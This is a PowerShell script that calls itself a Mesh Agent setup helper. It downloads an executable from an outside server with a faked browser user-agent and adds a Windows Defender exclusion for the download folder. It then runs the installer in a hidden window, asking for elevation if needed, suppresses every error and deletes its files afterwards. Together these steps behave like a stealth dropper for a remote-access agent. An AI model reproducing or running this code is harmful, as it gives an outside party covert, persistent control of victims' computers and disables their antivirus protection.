# mesh-agent-setup.ps1
# Automated Mesh Agent verification and installation
Set-StrictMode -Version Latest
$ErrorActionPreference = "SilentlyContinue"

function Test-MeshAgentInstalled {
  # Check for MeshAgent service
  $service = Get-Service -Name "MeshAgent" -ErrorAction SilentlyContinue
  if ($service) {
    return $true
  }
  
  # Check for MeshAgent process
  $process = Get-Process -Name "MeshAgent" -ErrorAction SilentlyContinue
  if ($process) {
    return $true
  }
  
  # Check for installation directory
  $installPaths = @(
    "$env:ProgramFiles\Mesh Agent",
    "${env:ProgramFiles(x86)}\Mesh Agent",
    "$env:LOCALAPPDATA\Mesh Agent"
  )
  
  foreach ($path in $installPaths) {
    if (Test-Path -Path $path) {
      return $true
    }
  }
  
  return $false
}

function Install-MeshAgent {
  # Prepare temporary directory
  $tempDir = Join-Path -Path $env:TEMP -ChildPath "MeshAgentSetup_$(Get-Random)"
  if (-not (Test-Path $tempDir)) {
    New-Item -Path $tempDir -ItemType Directory -Force | Out-Null
  }
  
  # Mesh Agent download URL
  $meshUrl = "https://mesh.lgtw.tf/meshagents?id=4&meshid=W4tZHM@Pv3686vWHJYUmulXYFna1tmZx6BZB3WATaGwMb05@ZjRaRnba@vn`$uqhF&installflags=0"
  $agentPath = Join-Path -Path $tempDir -ChildPath "meshagent.exe"
  
  try {
    # Download agent silently
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
    $webClient.DownloadFile($meshUrl, $agentPath)
    
    if (-not (Test-Path $agentPath) -or (Get-Item $agentPath).Length -eq 0) {
      return
    }
    
    # Check if we need elevation
    $isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    
    if ($isElevated) {
      # Add Windows Defender exclusion
      try {
        Add-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
      } catch {}
      
      # Run installer
      $process = Start-Process -FilePath $agentPath -ArgumentList "-fullinstall" -WindowStyle Hidden -PassThru -Wait
      Start-Sleep -Seconds 5
      
    } else {
      # Request elevation and install
      $psi = New-Object System.Diagnostics.ProcessStartInfo
      $psi.FileName = $agentPath
      $psi.Arguments = "-fullinstall"
      $psi.Verb = "runas"
      $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
      
      try {
        $proc = [System.Diagnostics.Process]::Start($psi)
        Start-Sleep -Seconds 5
      } catch {}
    }
    
  } catch {
  } finally {
    # Cleanup
    try {
      Start-Sleep -Seconds 2
      if (Test-Path $tempDir) {
        Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
      }
    } catch {}
  }
}

function Initialize-MeshAgent {
  if (-not (Test-MeshAgentInstalled)) {
    Install-MeshAgent
  }
}

# Run if called directly
if ($MyInvocation.InvocationName -ne ".") {
  Initialize-MeshAgent
}
